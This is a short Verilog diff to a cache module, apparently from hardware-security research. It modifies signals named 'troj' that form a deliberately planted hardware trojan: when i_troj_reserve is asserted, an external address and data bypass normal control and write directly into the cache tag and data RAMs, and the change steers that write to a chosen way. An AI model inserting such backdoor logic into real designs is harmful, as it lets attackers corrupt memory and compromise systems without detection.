@@ -520,11 +520,15 @@ wire [WAYS-1:0]			troj_tag_wen;
 
 assign troj_tag_addr 	= (i_troj_reserve) ? i_troj_addr[CACHE_ADDR32_MSB:CACHE_ADDR32_LSB] : tag_address;
 assign troj_tag_wdata  	= (i_troj_reserve) ? {1'b1, i_troj_addr[31:TAG_ADDR32_LSB]} : tag_wdata;
-assign troj_tag_wen	= (i_troj_reserve) ? 4'b0001 : tag_wenable_way;
+assign troj_tag_wen	= (i_troj_reserve) ?
+                            (troj_tag_wdata[9:8] == 2'b10)? 4'b0010 : 4'b0001 :
+                            tag_wenable_way;
 
 assign troj_cache_wdata = (i_troj_reserve) ? i_troj_data : data_wdata;
 assign troj_cache_addr 	= (i_troj_reserve) ? i_troj_addr[CACHE_ADDR32_MSB:CACHE_ADDR32_LSB] : data_address;
-assign troj_cache_wen 	= (i_troj_reserve) ? 4'b0001 : data_wenable_way;   
+assign troj_cache_wen 	= (i_troj_reserve) ?
+                            (troj_tag_wdata[9:8] == 2'b10)? 4'b0010 : 4'b0001 :
+                            data_wenable_way;   
 
 // ======================================
 // Instantiate RAMS
